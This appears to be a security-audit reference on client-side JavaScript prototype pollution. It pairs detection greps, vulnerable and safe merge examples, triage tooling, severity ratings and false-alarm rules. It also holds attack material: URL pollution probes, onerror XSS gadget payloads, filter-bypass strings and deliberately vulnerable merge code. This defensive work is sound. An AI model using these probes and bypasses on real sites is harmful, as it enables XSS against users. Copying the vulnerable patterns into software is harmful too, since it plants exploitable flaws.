Three overlapping detection patterns cover the broadest signal. Each is high-precision when paired with the safe patterns below.

| Pattern | What it catches |
|---------|-----------------|
| Prototype-polluting assignment | Direct `obj[user]` / `obj[user][..]` assignments where `user` could be `__proto__` or `constructor` |
| Known merge/extend helpers | Calls to known-vulnerable merge/extend helpers (`lodash.merge`, `_.defaultsDeep`, `extend`, `just-extend`, `merge.recursive`, `jQuery.extend(true, …)`, `Hoek.merge`/`applyToDefaults`, `deepmerge` pre-4.2) |
| Prototype-pollution utility | Helpers inside the codebase that *themselves* perform polluting recursive copy / deep assignment — i.e. the application's own `merge` is the sink. Enforces the structural shape: an enumerated property name simultaneously flows to the **base**, the **property** AND the **right-hand side** of a dynamic write. Hand-rolled merges this shape exactly almost always. |

The third query is the most useful in practice because it finds custom merges that no library list will catch.

### SAST grep indicators (client bundle)

Token-aware ripgrep starting points — pair hits with source (`location`/`postMessage`) and absence of safe guards:

```bash
# Known merge/set helpers in frontend bundle
rg -n '\.(extend|merge|mergeWith|defaultsDeep|set|setWith|zipObjectDeep)\s*\(' --glob '*.{js,jsx,ts,tsx}'

# jQuery deep extend
rg -n '\$\.extend\s*\(\s*true\s*,' --glob '*.{js,jsx,ts,tsx}'

# jQuery DOM-manipulation gadget call-sites — object form of .attr(), the
# .on()/.submit()/.off() helpers, and $.getScript()/$.get(); these read inherited
# polluted keys via for…in and are NOT fixed by the $.extend CVE patch (live in jQuery 3.7.1)
rg -n '\.attr\s*\(\s*\{|\.(on|one|off|submit)\s*\(|\$\.get(Script)?\s*\(' --glob '*.{js,jsx,ts,tsx}'

# Hand-rolled recursive merge / deep-assign
rg -n 'for\s*\(\s*(const|let|var)\s+\w+\s+in\s+\w+' --glob '*.{js,jsx,ts,tsx}'

# Bracket assignment from dynamic/user key
rg -n '\w+\[\s*\w+\s*\]\s*=' --glob '*.{js,jsx,ts,tsx}'

# Browser pollution sources
rg -n 'location\.(search|hash)|addEventListener\s*\(\s*[\'"]message[\'"]|postMessage' --glob '*.{js,jsx,ts,tsx}'

# Hash/query parsers that walk dotted/bracket keys
rg -n 'decodeURIComponent|split\s*\(\s*[\'"][&=.\\[\\]]' --glob '*.{js,jsx,ts,tsx}'
```

High-confidence triad: source grep + merge/set grep on same file or import chain + DOM/sanitizer gadget read (`innerHTML`, `ALLOWED_ATTR`, `whiteList`, `new URL(`).

### jQuery DOM-manipulation gadgets are version-independent sinks

Several jQuery gadgets fire through ordinary DOM helpers, **not** through `$.extend`, so they remain exploitable in the **latest jQuery (3.7.1)** — patching jQuery for CVE-2023-26136/26140 does *not* remove them. Treat these call-sites as gadget sinks whenever the page can be polluted (do not mark SAFE merely because jQuery is current):

- **`$(sel).attr(obj)` — object / multi-attribute form.** jQuery runs `for (k in obj)` over the argument, so inherited polluted keys are applied as DOM attributes. The two-argument form `$(sel).attr('src', val)` is **not** this sink — only the single-object form is. Grep `\.attr\s*\(\s*\{`.
- **Case matters (key-collision bypass).** Attackers pollute mixed-case keys (`SRC`, `OnError`) rather than `src`/`onerror`: JS property lookup is case-sensitive, so `SRC` does not collide with a legitimate own `src` the app already set on the object — but HTML attribute names are case-insensitive, so jQuery's `setAttribute('SRC'/'OnError', …)` still lands as a working `src`/`onerror` → `<img SRC=x OnError=alert(1)>`. A polluted property whose name only differs from a real one by case is a strong gadget signal.
- **`$(sel).on(...)` / `.submit()` / `.off()`** read inherited `handler` / `selector` / `needsContext` / `delegateType` / `delegateTarget` (from `Object.prototype` **or** `Function.prototype`) and can reach a `jQuery(selector)` HTML-parse sink on user interaction.
- **`$.getScript(...)` / `$.get(...)`** pick up polluted `url` / `src` / `dataType` / `crossDomain` defaults and load attacker script.
- **`$(htmlString)`** parses inherited `div[0]` / `div[1]` defaults into HTML.

### Gadget-read patterns — where a polluted default is consumed

A *gadget read* is any expression that reads a property which can fall through to a polluted prototype. These are **candidate** sinks: confirm a real pollution source AND a security-sensitive use (HTML / URL / script / auth-flag / redirect) before reporting. Beyond the obvious `obj.x` and `obj.x ?? d`, these forms are easily missed because they don't look like a DOM write — several are pure **logic / feature-flag / privilege gadgets that need no DOM sink at all**:

| Read form | Example | Why it's a gadget |
|-----------|---------|-------------------|
| `in` operator | `if ('isAdmin' in user)` / `if ('beta' in cfg)` | `in` walks the prototype chain, so pollution makes the membership test **true** — a control-flow / feature-flag / privilege gadget. **Distinct from `InExprGuard`** (which is `in` used as a merge-time blocklist, e.g. `if (!(key in dst))`): reading `'x' in obj` for application logic is the *opposite* — an attacker-controllable read, not a sanitizer. |
| Destructuring + default | `const { isAdmin = false } = user` | The default fires only when the lookup is `undefined`; a polluted `Object.prototype.isAdmin` is consumed instead, so the "safe" default is silently skipped. |
| Default function parameter | `function init(opts = {}) {…opts.x}` / `({ timeout = 30 } = opts)` | The `= {}` / `= default` object still inherits polluted keys; every later `opts.x` read is a gadget. |
| `??` / `||` fallback | `const u = opts.returnUrl ?? '/'` | A polluted `returnUrl` short-circuits the fallback → reaches `location.assign`, `fetch`, `new Worker`, etc. |
| `for…in` over a config object | `for (const k in cfg) apply(k, cfg[k])` | Enumerates inherited keys (also a merge sink — see above). |
| Computed / bracket access | `headers['if-modified-since']`, `map[ext]`, `registry[userKey]` | A lookup into a map/registry/header object by a key that may be **absent** falls through to the polluted prototype and returns the injected value instead of `undefined` — distinct from dot access because the key is often *dynamic* (so name-based review misses it), and a preceding `'x' in map` guard does **not** save you (the `in` test is itself polluted). |

```bash
# Gadget-read candidates (pair with a confirmed pollution source + a sensitive use)
rg -n "['\"][A-Za-z_][\w-]*['\"]\s+in\s+\w+" --glob '*.{js,jsx,ts,tsx}'          # 'flag' in obj
rg -n '(const|let|var)\s*\{[^}]*=[^}]*\}\s*=' --glob '*.{js,jsx,ts,tsx}'          # destructuring defaults
rg -n '\([^)]*=\s*\{\s*\}[^)]*\)' --glob '*.{js,jsx,ts,tsx}'                      # default {} parameters
rg -n '\w+\.\w+\s*(\?\?|\|\|)\s*' --glob '*.{js,jsx,ts,tsx}'                      # obj.x ?? / || default
rg -n '\w+\[[A-Za-z_$][\w$]*\]' --glob '*.{js,jsx,ts,tsx}'                        # obj[dynamicKey] map/registry lookup (noisy; confirm key may be absent)
```

These read patterns are intentionally broad (they also match benign code) — treat a hit as a gadget only when (1) the object is reachable from a proven pollution source and (2) the read drives HTML/URL/script execution or a security decision (auth flag, feature gate, redirect target). This is exactly the candidate-then-confirm model dynamic gadget-finders use.

### VULN — recursive `for…in` merge of attacker JSON / hash

```javascript
function deepCopy(dst, src) {
  for (const k in src) {                                  // walks inherited
    if (typeof src[k] === 'object' && src[k] !== null)
      deepCopy(dst[k] = dst[k] || {}, src[k]);
    else dst[k] = src[k];
  }
}
deepCopy(config, JSON.parse(location.hash.slice(1)));    // VULN — matches prototype-pollution-utility pattern
```

### VULN — split-and-reduce hash parser

```javascript
function parseHash() {
  const out = {};
  location.hash.slice(1).split('&').forEach(kv => {
    const [k, v] = kv.split('=');
    const keys = decodeURIComponent(k).split(/[\.\[\]]+/).filter(Boolean);
    let o = out;
    for (let i = 0; i < keys.length - 1; i++) o = o[keys[i]] ||= {};
    o[keys.at(-1)] = decodeURIComponent(v || '');
  });
  return out;
}
Object.assign(globalConfig, parseHash());                // VULN — `keys` may include "__proto__"
```

### VULN — `$.extend(true, …)` of attacker JSON

```javascript
$.extend(true, settings, JSON.parse(payload));           // VULN — CVE-2023-26136 in jQuery 3.6.0–3.6.3
```

### VULN — `_.merge` / `_.set` in browser bundle

```javascript
_.merge(target, JSON.parse(event.data));                 // postMessage source
_.set(state, req.hash.path, req.hash.value);             // path may be "__proto__.x"
```

### VULN — known-vulnerable URL parser loaded on page

Static evidence the page imports / bundles any of:

```
jquery-query-object, jquery-sparkle, jquery-bbq, jquery-deparam, jquery-parseparam,
MooTools More, purl (jquery-url-parser), backbone-query-parameters, V4Fire Core,
CanJS deparam, HubSpot tracking code, YUI 3 querystring-parse, mutiny,
component/querystring, arg.js, davis.js, Aurelia path, php.js parse_str,
analytics-utils < 1.0.3, Wistia embed, Swiftype, Marionette.js,
HotJar/Adobe DTM/Demandbase/Embedly/Tealium/Boomerang/Pendo/Twitter UWT/recaptcha
(when loaded as a known-vulnerable inline gadget)
```

### SAFE — `Object.create(null)` everywhere a user key is stored

```javascript
const config = Object.create(null);                      // no prototype; pollution has no target
config[userKey] = userValue;

const settings = { __proto__: null };                    // equivalent null-prototype literal
settings[userKey] = userValue;                           // bracket-writing "__proto__" here is harmless — no prototype to reach
```

`Object.create(null)` excludes this case — a base reachable through `Object.create(null)` is not flagged. The object-literal form `{ __proto__: null }` is **equivalent** (it creates a null-prototype object; `ObjectCreateNullCall` recognizes both). A later `obj['__proto__'] = x` on a null-prototype object writes a harmless own property and does not pollute.

### SAFE — destination-side `hasOwnProperty` guard

```javascript
function merge(dst, src) {
  for (const key in src) {
    if (!Object.hasOwn(src, key)) continue;
    if (Object.hasOwn(dst, key) && isObject(dst[key])) merge(dst[key], src[key]);
    else dst[key] = src[key];
  }
}
```

`HasOwnPropertyGuard` only treats this as a sanitizer when applied to the **destination** object, not the source — `__proto__`/`constructor` are own properties of attacker-crafted source objects but are NOT own properties of normal destination objects.

### SAFE — explicit blocklist (`__proto__`, `constructor`, `prototype`)

```javascript
function safeMerge(target, source) {
  for (const key in source) {
    if (!Object.hasOwn(source, key)) continue;
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;
    if (isObject(source[key])) safeMerge(target[key] ||= {}, source[key]);
    else target[key] = source[key];
  }
}
```

`BlacklistEqualityGuard` and `BlacklistInclusionGuard` recognise these patterns as sanitizers.

### SAFE — `Object.freeze(Object.prototype)` (and friends) at startup

```javascript
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(Map.prototype);
Object.freeze(Function.prototype);
```

In strict-mode, attempts to write polluted properties throw; in sloppy mode they silently no-op. Be aware some polyfills extend prototypes at load time and break under freeze. Apply as the *first* script the page runs.

`Object.seal(Object.prototype)` is a valid (slightly weaker) alternative recognized as a sanitizer: seal blocks **adding new properties** — which is exactly the classic pollution vector (`Object.prototype.<newGadget> = …`) — while still allowing existing own properties to be overwritten. It is often recommended as a good compromise when `Object.freeze` breaks a library that legitimately mutates prototypes. Treat `Object.seal(Object.prototype)` early in load order like `Object.freeze` for triage (credit it as a source-blocking defense). On Node/SSR bundles, the `--disable-proto=delete` runtime flag is a defense-in-depth measure that removes the `__proto__` accessor (does not stop `constructor.prototype`); see `references/server_side_prototype_pollution.md`.

### SAFE — `structuredClone()` for deep clones

```javascript
const clone = structuredClone(userInput);                // does not walk prototype chain
```

Replaces the unsafe `JSON.parse(JSON.stringify(obj))` and ad-hoc deep-merge snippets. Note `structuredClone` does NOT merge — it clones — so this is a "don't-deep-merge-in-the-first-place" defense.

### SAFE — `Map` / `Set` instead of plain object

```javascript
const cache = new Map();
cache.set(userKey, userValue);                           // Map.get/.set do not walk the prototype chain
cache.get('evil');                                       // → undefined even if Object.prototype.evil is polluted

const allowed = new Set();
allowed.add(userValue);                                  // Set.has/.add are own-only — pollution-proof for value storage
allowed.has('evil');                                     // → false even when Object.prototype.evil is polluted
```

`Map`/`Set` access methods (`get`/`set`/`has`/`add`) only see own entries, so a polluted `Object.prototype` default is never returned — they are recommended over option/allow-list object literals. Use `Map` for key→value config, `Set` for value membership.

### SAFE — `Reflect.set(target, key, value)` and `Object.defineProperty` (with care)

`Reflect.set(target, '__proto__', x)` writes `__proto__` as an *own* data property of `target` — it does NOT walk the prototype chain. The same holds for `Object.defineProperty(target, '__proto__', { value: x, writable: true, enumerable: true, configurable: true })`. Both are safer than bracket assignment when the key is attacker-controlled:

```javascript
// Bracket assignment — pollutes when key is "__proto__"
target['__proto__'] = src;                        // VULN

// Reflect.set — assigns as own property, does NOT pollute
Reflect.set(target, key, value);                  // SAFE for prototype-pollution
```

However, `Object.defineProperty(target, userKey, { value })` is **still a sink** if the *value* is later read by inherited-property logic — it sets an *own* property of `target`, but if `target` is itself `Object.prototype` (or any shared prototype), that own property propagates to every inheritor. Only the bracket-key vector is mitigated; the prototype-shared-object vector is not.

### SAFE — `Object.assign(target, src)` / spread `{ ...src }` / `Object.fromEntries`

A common false-positive class: these built-ins do **not** behave like `_.merge`. Specifically:

| Operation | Pollutes when `src` is `JSON.parse('{"__proto__":{"x":1}}')`? | Why |
|-----------|:--:|------|
| `_.merge(target, src)` / hand-rolled `for…in` recursive copy | **YES** | Walks nested `__proto__` key as a regular property name |
| `Object.assign(target, src)` | **No** | Copies own enumerable properties; the `__proto__` of `src` becomes a *getter/setter trigger* on `target`'s prototype assignment, not a pollution write |
| `{ ...src }` (object spread) | **No** | Same semantics as `Object.assign` for own-property copying |
| `Object.fromEntries(Object.entries(src))` | **No** | Same — only own enumerable string-keyed properties |
| `structuredClone(src)` | **No** | Does not walk the prototype chain |

The dangerous step is *recursive* copying into a *real* object (`target`'s nested objects also receive merged keys). `Object.assign`, spread, and `Object.fromEntries` are shallow — they never recurse, so even an attacker `__proto__` key cannot reach `Object.prototype` through them. If a finding pivots on one of these built-ins as the only sink, downgrade to FALSE POSITIVE unless the value is subsequently passed to a recursive merge.

**Caveat — `__proto__` setter on a real object**: `Object.assign(target, { __proto__: { x: 1 } })` does NOT pollute `Object.prototype`, but it DOES change `target`'s prototype to `{ x: 1 }`. This breaks `target`'s prototype chain (a different bug class — type confusion / prototype hijack on that specific object) but does NOT affect the global `Object.prototype`. Treat as a separate (usually lower-severity) finding when the target is a shared service object.

### SAFE — `is-plain-object` / `is-extendable` check before recursing

```javascript
const isPlainObject = require('is-plain-object').default;
function merge(dst, src) {
  for (const k of Object.keys(src)) {
    if (isPlainObject(src[k]) && isPlainObject(dst[k])) merge(dst[k], src[k]);
    else dst[k] = src[k];
  }
}
```

`IsPlainObjectGuard` — `__proto__` payloads (which are `Object.prototype`) and constructor-chained payloads (which point at `Function.prototype`) both fail the plain-object test.

### SAFE — JSON Schema validation before merge (Ajv / Zod / similar)

Validate parsed URL/JSON/postMessage payloads against a strict schema with `additionalProperties: false` (or equivalent) **before** any deep merge. Schema validators strip unknown keys including `__proto__`, `constructor`, `prototype` at the boundary.

```javascript
const parsed = JSON.parse(event.data);
const valid = configSchema(parsed);                   // strict schema; no extra keys
if (valid) Object.assign(safeConfig, valid);          // shallow assign of validated subset only
```

Do not treat schema validation as sufficient if validated output is later passed to `_.merge` / `$.extend(true,…)` with unvalidated sibling objects.

### VULN — lodash/jQuery merge or set on untrusted browser input

```javascript
_.merge(state, JSON.parse(location.hash.slice(1)));   // VULN — never merge raw parsed URL/hash/postMessage
_.set(opts, userPath, userVal);                       // VULN — userPath may be "__proto__.innerHTML"
$.extend(true, settings, event.data);                 // VULN — deep extend of postMessage payload
```

Prefer `structuredClone` for deep copy, `Map` for dynamic keys, or shallow `Object.assign` after schema validation — not recursive merge on tainted objects.

---

## Tooling for Triage

These are dynamic-testing capabilities, useful when the user explicitly asks for runtime verification or to find sources/gadgets in a minified bundle. SAST findings should still cite source patterns from above.

- **Browser-based PP scanners** automatically mutate parameter names (`__proto__`, `constructor.prototype`, dot/bracket variants) on every page navigation, poll `Object.prototype` for reflected pollution, and at sink-time show the exact dereference site.
- **Automated payload fuzzers** support ES-modules, HTTP/2, and WebSocket endpoints; browser mode spins up headless Chromium and bruteforces DOM-API gadget classes.
- **Payload generators** produce markers such as `constructor[prototype][marker]=reserved`, used together with the breakpoint-debugger snippet below to find the vulnerable code path in a minified bundle.
- **Gadget-candidate instrumentation** hooks JS (Node loader or browser agent) and logs every read of a potentially-polluted property, classified by AST shape: property access, element access, `for…in`, **`in` expression**, destructuring/variable declaration with defaults, object literals, and **default function parameters**. Lazy-start mode logs only gadgets reachable *after* the pollution point; configurable prototype targets cover non-`Object` prototypes. This transformer taxonomy doubles as the gadget-read taxonomy above.
- **Passive browser extensions** watch navigation and flag successful pollution.
- **DevTools prototype-chain visualizers** show prototype chains in real-time and flag writes to `onerror`, `innerHTML`, `srcdoc`, `id`, etc.

### Debug-property snippet

When tooling confirms pollution but the exact dereference is buried, drop this into the JS console *while paused* on the first script breakpoint:

```javascript
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
  __proto__: null,
  get() {
    console.trace();
    return 'polluted';
  },
});
```

`YOUR-PROPERTY` is a candidate gadget (e.g., `innerHTML`, `src`, `href`, `onerror`, `srcdoc`, `whiteList`, `ALLOWED_ATTR`, `template`, `sourceURL`). Resume execution; every time the property is read by anything in the page, the console gets a stack trace pointing to the vulnerable line — the topmost frame in a *library* file is usually the gadget; the bottommost is usually the source.

---

## Dynamic Test / PoC

**URL/query pollution probes** — load each in a fresh tab; bracket, dot, and constructor forms exercise different filters:

```
https://TARGET/?__proto__[polluted]=1
https://TARGET/?__proto__.polluted=1
https://TARGET/?constructor[prototype][polluted]=1
https://TARGET/#__proto__[polluted]=1
```

**Pollution reflection** — in DevTools console after navigation:

```javascript
console.log(({}).polluted);  // "1" (or injected value) confirms Object.prototype write
```

**Gadget escalation probes** — use documented gadget keys when a library is known; otherwise harmless property names confirm inherited-default reads:

```javascript
Object.prototype.innerHTML = '<img src=x onerror=console.log(1)>';
Object.prototype.src = 'javascript:console.log(1)';
Object.prototype.href = 'javascript:console.log(1)';
Object.prototype['data-tooltip'] = '<img src=x onerror=console.log(1)>';
```

Re-test `constructor[prototype]` when `__proto__` is stripped; re-test `#__proto__…` when only hash parsers are in scope.

---

## Confirming a Finding

1. Identify the pollution source: name the parser/merge call (`location.hash` walked by `jquery-deparam`, `$.extend(true, …)`, `_.merge`, hand-rolled `for…in`, cataloged URL parser, etc.) and show the file + line.
2. Trace user-controlled keys to that sink with no `Object.create(null)` target / `Object.hasOwn` guard / `__proto__`-blocklist between source and sink.
3. Confirm reachability of a gadget *in the same realm*. Strong evidence:
   - The page bundles a known cataloged gadget library, AND
   - The polluted property name matches a documented gadget config key (`innerHTML`, `src`, `srcdoc`, `onerror`, `ALLOWED_ATTR`, `whiteList`, `sourceURL`, `template`, `customScriptSrc`, `assethost`, `dataHost`, `cookieName`, …).
   - Or — since 2023 — the page contains any code that calls `new URL(…)` / `new Notification(…)` / `new Worker(…)` / `new Image()` / `new URLSearchParams(…)` and the polluted property is `href` / `title` / `name` / `src` / `toString`.
4. Construct the canonical payload form: bracket OR dot OR constructor variant. If `__proto__` is filtered, retry with `constructor[prototype]`. If the filter is a non-recursive *strip*, try the recursive-strip bypass for whichever token is removed — `__pro__proto__to__`, `constconstructorructor`, and/or `protoprototypetype` (a triple single-pass strip still leaves the `constructor.prototype` route open).
5. Demonstrate the gadget firing — preferred form: harmless `alert(1)` or `console.log` for proof-of-concept. Avoid network beacons in shared environments.
6. Distinguish severity by gadget reached (table below). DOM XSS → High; sanitizer bypass that lets the attacker re-render arbitrary HTML elsewhere → Critical; cookie injection or open-redirect-only → Medium-High.

---

## False Alarms — Do NOT Report

- The "merge" target is `Object.create(null)` or a `{ __proto__: null }` literal *and* the prototype-less object never feeds back into a real `Object`-prototyped object (`ObjectCreateNullCall` excludes both forms).
- User-controlled values/keys are stored in a `new Set()` / `new Map()` and read only via `.has()` / `.get()` — these never return polluted prototype defaults.
- The page runs `Object.seal(Object.prototype)` (or `Object.freeze`) early — seal blocks new-property addition, the classic pollution write; verify it precedes any merge in load order.
- The merge is gated by a destination-side `hasOwnProperty` guard (`HasOwnPropertyGuard`) on the destination — `__proto__`/`constructor` are *not* own properties of normal destination objects.
- The merge is gated by an explicit `key === '__proto__' || key === 'constructor' || key === 'prototype'` blocklist (`BlacklistEqualityGuard` / `BlacklistInclusionGuard`).
- The merge is preceded by `is-plain-object` / `is-extendable` (`IsPlainObjectGuard`).
- Patched library versions: lodash >= 4.17.21, jQuery >= 3.7.0 (CVE-2023-26136/26140 patched), DOMPurify >= 3.0.9 (CVE-2024-45801 patched), sanitize-html >= 2.8.1. **Caveat:** the jQuery patch only closes the `$.extend(true,…)` pollution *sink* — the DOM-manipulation *gadgets* (`$(x).attr({…})`, `$(x).on/.submit`, `$.getScript`, `$(html)`) are NOT fixed and remain exploitable in jQuery 3.7.1 when a separate pollution source exists. Do not mark these SAFE on version alone.
- A pollution source with no gadget that reaches a security-sensitive sink — i.e., the page never bundles any of the cataloged script gadgets, never calls a known browser-API gadget, and the app code does not interpolate any inherited property into HTML / URL / script / sanitizer config. Cap at INFO/Low (defense-in-depth).
- Hash payloads where the page never calls `location.hash` / `URL` parsers and `JSON.parse` with prototype-walking merge. The `#` is browser-only — without a parser, there is no source.
- `JSON.parse(req.body)` alone — `__proto__` becomes own property of the parsed object; only the *next* `_.merge`/recursive copy escalates it.
- Pages that run `Object.freeze(Object.prototype)` at the very first script — verify the freeze precedes any merge in the load order.

---

## Severity Heuristics

| Gadget reached | Default severity |
|----------------|:----------------:|
| Reflected DOM XSS via `innerHTML` / `srcdoc` / `template` polluted gadget on a page reachable by victim with attacker-supplied URL | **High** |
| Stored CSPP via persisted `localStorage`/`sessionStorage`/cached postMessage payload that fires for every visitor on next load | **Critical** |
| HTML-sanitizer bypass that allows an attacker to deliver XSS payloads in *any* sanitized HTML on the polluted page (forum posts, profile fields, etc.) | **Critical** |
| Browser-API gadget (URL/href, Notification/title, Worker/name, Image/src, URLSearchParams/toString) reachable via any pollution source on the same origin | **High–Critical** |
| Arbitrary script load gadget (`Akamai Boomerang.url`, `@analytics/google-tag-manager.customScriptSrc`, `Pendo.dataHost`, `Closure.CLOSURE_BASE_PATH`, `hCaptcha.assethost`) | **Critical** (full-origin compromise via attacker JS) |
| Cookie-injection-only gadget (`Google Analytics.cookieName`) | **Medium** |
| Open-redirect-only gadget (`URLSearchParams.toString` chained with `location.assign`) | **Medium** |
| Pollution source confirmed but no gadget reachable on the page | **Low / Informational** (defense-in-depth) |

**Downgrade** by one level when: the page runs `Object.freeze(Object.prototype)` early, or the only reachable gadget is in dead code, or exploitation requires the victim to perform a chained action (open URL + click + submit) that materially raises attacker effort.

---

## Business Risk

- **Realm-wide compromise.** A successful pollution affects every plain object in the page's JS realm for the page's lifetime — not just the merge target. A single GET request from a marketing campaign or a poisoned cached payload can subvert authentication forms, profile pages, admin tooling.
- **Stealth and longevity.** Pollution does not throw — undefined-property reads simply return the polluted value. Detection requires explicit instrumentation (DevTools `Object.defineProperty` snippet, prototype-chain visualizers, browser-based PP scanners). Symptom-free until the gadget fires.
- **Same-origin pivot.** CSPP commonly pairs with sanitizer-bypass to make stored XSS payloads exploitable that were previously blocked by the sanitizer — pollution is set on visit-1, sanitizer-bypass payload is rendered on visit-2 (which may target a different user/session within the same origin).
- **Third-party tag amplification.** Many CSPP gadgets ship invisibly via marketing tags (Tealium, Adobe DTM, Boomerang, Demandbase, Pendo, Twitter UWT, GTM). The application owner often does not know they are vulnerable.
- **CSP partially helpful but not sufficient.** Strict `script-src 'self'` blocks `<script>`-injection gadgets but not URL-handler XSS (`javascript:` href / `data:` `dataType=script`), DOM-clobbering, sanitizer bypass, or `Object.prototype.href` browser-API gadgets. CSP is defense-in-depth, not a CSPP fix.

---

## Core Principle

Treat every browser-resident parser of `location.search` / `location.hash` / `JSON.parse(...)` / `postMessage`/WS payload that walks attacker keys as a pollution sink unless it is provably safe via:

1. `Object.create(null)` target object that never re-enters a real `Object`-prototyped object, OR
2. Destination-side `hasOwnProperty` / `Object.hasOwn` guard before recursing, OR
3. Explicit blocklist of `__proto__`, `constructor`, `prototype` (recursive — blocking once is bypassable via `__pro__proto__to__`), OR
4. `Map` / `structuredClone` instead of deep merging plain objects, OR
5. `Object.freeze(Object.prototype)` (plus `Array.prototype`, `Map.prototype`, `Function.prototype`) as the first script of the page.

Then audit the gadget surface — every catalog-listed library, every HTML sanitizer, every browser-API constructor (`URL`, `Notification`, `Worker`, `Image`, `URLSearchParams`) — and assume that any read of an undefined property from a config-style object is a gadget. Pair the sink with the gadget to determine real impact; do not report sink-only or gadget-only findings as Critical.

For server-side variants of this same conceptual flow (Node.js `child_process` / `execArgv` / `lodash.template` / `bson` chains), see `references/server_side_prototype_pollution.md`.

---

## Analyst Notes

1. The pollution source decides whether the bug fires at all — check the URL/hash/JSON/postMessage/storage pipeline carefully and remember that **hash payloads bypass every server-side filter and most CDN-level WAFs**.
2. The script gadget decides the impact — check the bundle and every tag manager / analytics / sanitizer it loads against the script-gadget catalog and the browser-API gadget list. If both pollution and any of these load on the same page, severity is at least High.
3. `JSON.parse` of attacker JSON is *not* a pollution sink by itself — escalation requires a downstream `$.extend(true, …)` / `_.merge` / recursive copy that walks the parsed object.
4. The **`constructor[prototype]`** variant is the most common "we filtered `__proto__`" bypass; always test it in addition to the dot-bracket variants.
5. The **double-sanitization** payload is the most common "we strip the token" bypass; always test it when a non-recursive strip is observed — and for **all three** tokens (`__pro__proto__to__`, `constconstructorructor`, `protoprototypetype`), since stripping `constructor`/`prototype` once does not close the `constructor.prototype` route.
6. Browser-API gadgets (since 2023) make every page exploitable once any pollution source on the same origin is reached. Recommend `Object.freeze(Object.prototype)` at the top of the load order regardless of the bundle's library mix.
7. For browser-scanner-confirmed CSPP, also re-test in incognito / a fresh profile to rule out a stale extension polluting the prototype chain. Browser extensions can pollute, too.
8. When a finding involves a third-party tag (Tealium, Adobe DTM, Boomerang, etc.), document which tag's gadget is reached — the tag vendor, not the app team, is usually the upstream fix owner.

## Sources, Sinks & Sanitizers

Three JavaScript detection patterns cover **browser and Node** contexts; CSPP findings arise when sources are `location.search`/`hash`, `postMessage`, or client-side `JSON.parse` reaching merge sinks in bundled code.

| Pattern | CSPP relevance |
|---------|----------------|
| Prototype-polluting assignment | `config[userKey]=…` in SPA bundle; `__proto__` from decoded query |
| Known merge/extend helpers | `$.extend(true,…)`, `_.merge` in client bundle |
| Prototype-pollution utility | Hand-rolled hash parsers / `for…in` merges in frontend code |

**Sources**: client remote sources (URL, DOM storage, WebSocket) modeled as tainted objects after parse.

**Sanitizers**: identical to server-side — `Object.create(null)`, destination `Object.hasOwn`, blocklists, `is-plain-object`, `structuredClone` (no merge).

**Pair with manual gadget review**: automated rules do not enumerate cataloged script gadgets or browser-API gadgets (`URL`, `Image`) — sink-only hits stay LOW until gadget confirmed.

Per-library URL parser CVE list (jquery-deparam, etc.) requires dependency/version heuristics; DOMPurify sanitizer-bypass gadgets require separate XSS/sanitizer analysis.
